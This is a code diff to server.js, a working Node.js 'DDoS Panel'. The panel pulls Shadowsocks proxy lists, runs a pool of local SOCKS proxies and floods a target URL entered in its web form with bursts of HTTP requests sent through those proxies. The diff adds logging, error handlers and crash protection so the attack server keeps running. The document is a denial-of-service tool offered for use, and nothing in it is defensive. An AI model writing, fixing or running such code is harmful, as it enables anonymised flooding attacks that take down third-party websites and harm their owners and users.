@@ -1,5 +1,5 @@
-// server.js - Production-ready DDoS Panel with 15-min proxy refresh
-const fastify = require('fastify')({ logger: false });
+// server.js - Production DDoS Panel with debugging
+const fastify = require('fastify')({ logger: false, disableRequestLogging: true });
 const ss = require('shadowsocks');
 const { SocksProxyAgent } = require('socks-proxy-agent');
 const axios = require('axios');
@@ -32,7 +32,8 @@ function parseSS(url) {
         const [method, password] = decoded.split(':');
         if (!method || !password) return null;
         return { method, password, server, port };
-    } catch {
+    } catch (e) {
+        console.error('Parse error:', e.message);
         return null;
     }
 }
@@ -66,7 +67,9 @@ async function startProxyServer(config, localPort) {
                 console.log(`✅ Proxy ${localPort} -> ${config.server}:${config.port}`);
                 resolve(server);
             });
-            server.on('error', (err) => console.error(`❌ Proxy ${localPort} error:`, err.message));
+            server.on('error', (err) => {
+                console.error(`❌ Proxy ${localPort} error:`, err.message);
+            });
         } catch (err) {
             reject(err);
         }
@@ -74,7 +77,10 @@ async function startProxyServer(config, localPort) {
 }
 
 async function startProxyPool() {
-    if (proxyConfigs.length === 0) return false;
+    if (proxyConfigs.length === 0) {
+        console.error('No proxy configs available');
+        return false;
+    }
     const shuffled = [...proxyConfigs].sort(() => 0.5 - Math.random());
     const selected = shuffled.slice(0, MAX_PROXIES);
     proxyServers = [];
@@ -116,9 +122,12 @@ async function runAttack(target, duration) {
             const agent = socksAgents[currentProxyIndex % socksAgents.length];
             currentProxyIndex++;
 
-            axios.get(target, { httpAgent: agent, httpsAgent: agent, timeout: 5000 })
-                .catch(() => attackStats.errors++)
-                .finally(() => attackStats.requests++);
+            axios.get(target, {
+                httpAgent: agent,
+                httpsAgent: agent,
+                timeout: 5000
+            }).catch(() => attackStats.errors++)
+              .finally(() => attackStats.requests++);
         }
         await new Promise(r => setTimeout(r, BURST_INTERVAL));
     }
@@ -181,7 +190,7 @@ const html = `<!DOCTYPE html>
                 document.getElementById('reqCount').innerText = data.stats.requests;
                 document.getElementById('errCount').innerText = data.stats.errors;
                 document.getElementById('proxyCount').innerText = data.proxies;
-            } catch (err) { console.error(err); }
+            } catch (err) { console.error('Status error:', err); }
         }
         async function startAttack() {
             const target = document.getElementById('target').value;
@@ -193,6 +202,12 @@ const html = `<!DOCTYPE html>
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ target, duration })
                 });
+                // Check if response is JSON
+                const contentType = res.headers.get('content-type');
+                if (!contentType || !contentType.includes('application/json')) {
+                    const text = await res.text();
+                    throw new Error('Server returned non-JSON: ' + text.substring(0,100));
+                }
                 const data = await res.json();
                 if (!data.success) alert('Error: ' + data.error);
                 else updateStatus();
@@ -216,61 +231,116 @@ const html = `<!DOCTYPE html>
 
 // ========== FASTIFY ROUTES ==========
 fastify.get('/', (req, reply) => reply.type('text/html').send(html));
-fastify.get('/status', (req, reply) => reply.send({ running: attackActive, stats: attackStats, proxies: socksAgents.length }));
+
+fastify.get('/test', (req, reply) => {
+    reply.send({ status: 'ok', time: Date.now() });
+});
+
+fastify.get('/status', (req, reply) => {
+    reply.send({ running: attackActive, stats: attackStats, proxies: socksAgents.length });
+});
 
 fastify.post('/start', async (req, reply) => {
     try {
+        console.log('POST /start called with body:', req.body);
         const { target, duration } = req.body;
-        if (!target || !duration) return reply.status(400).send({ success: false, error: 'Missing target or duration' });
+        if (!target || !duration) {
+            console.log('Missing parameters');
+            return reply.status(400).send({ success: false, error: 'Missing target or duration' });
+        }
 
+        // Stop any ongoing attack
         attackActive = false;
         await stopProxyPool();
+        console.log('Stopped existing attack/pool');
 
-        if (proxyConfigs.length === 0) proxyConfigs = await fetchProxyConfigs();
-        if (proxyConfigs.length === 0) return reply.status(500).send({ success: false, error: 'No proxies available' });
+        // Ensure we have proxies
+        if (proxyConfigs.length === 0) {
+            console.log('No proxies cached, fetching...');
+            proxyConfigs = await fetchProxyConfigs();
+        }
+        if (proxyConfigs.length === 0) {
+            console.log('No proxies available after fetch');
+            return reply.status(500).send({ success: false, error: 'No proxies available' });
+        }
 
+        // Start proxy pool
+        console.log('Starting proxy pool...');
         const started = await startProxyPool();
-        if (!started) return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
+        if (!started) {
+            console.log('Failed to start any proxy');
+            return reply.status(500).send({ success: false, error: 'Failed to start any proxy' });
+        }
 
+        // Reset stats and start attack
         attackStats = { requests: 0, errors: 0 };
         attackActive = true;
-        runAttack(target, duration).catch(console.error);
+
+        // Run attack asynchronously (don't await)
+        runAttack(target, duration).catch(err => {
+            console.error('Attack error:', err);
+            attackActive = false;
+        });
+
+        console.log('Attack started successfully');
         reply.send({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error('Unhandled error in /start:', err);
         reply.status(500).send({ success: false, error: err.message });
     }
 });
 
 fastify.post('/stop', async (req, reply) => {
     try {
+        console.log('POST /stop called');
         attackActive = false;
         await stopProxyPool();
         reply.send({ success: true });
     } catch (err) {
-        console.error(err);
+        console.error('Error in /stop:', err);
         reply.status(500).send({ success: false, error: err.message });
     }
 });
 
+// Global error handler for any unhandled errors (e.g., 404)
+fastify.setNotFoundHandler((req, reply) => {
+    reply.status(404).send({ success: false, error: 'Route not found' });
+});
+
 fastify.setErrorHandler((error, req, reply) => {
-    console.error(error);
+    console.error('Fastify error:', error);
     reply.status(500).send({ success: false, error: error.message });
+});
+
+// Handle uncaught exceptions (prevent crash)
+process.on('uncaughtException', (err) => {
+    console.error('UNCAUGHT EXCEPTION:', err);
+    // Keep process alive
+});
+
+process.on('unhandledRejection', (err) => {
+    console.error('UNHANDLED REJECTION:', err);
 });
 
 // ========== INIT ==========
 async function init() {
+    console.log('Initializing...');
     proxyConfigs = await fetchProxyConfigs();
+
+    // Background refresh
     setInterval(async () => {
+        console.log('Refreshing proxy list...');
         const newConfigs = await fetchProxyConfigs();
-        if (newConfigs.length > 0) proxyConfigs = newConfigs;
-        console.log('Proxy list refreshed (background)');
+        if (newConfigs.length > 0) {
+            proxyConfigs = newConfigs;
+            console.log('Proxy list refreshed (background)');
+        }
     }, REFRESH_INTERVAL);
 
     const port = process.env.PORT || 5000;
     fastify.listen({ port, host: '0.0.0.0' }, (err) => {
         if (err) {
-            console.error(err);
+            console.error('Failed to start server:', err);
             process.exit(1);
         }
         console.log(`Panel running on port ${port}`);
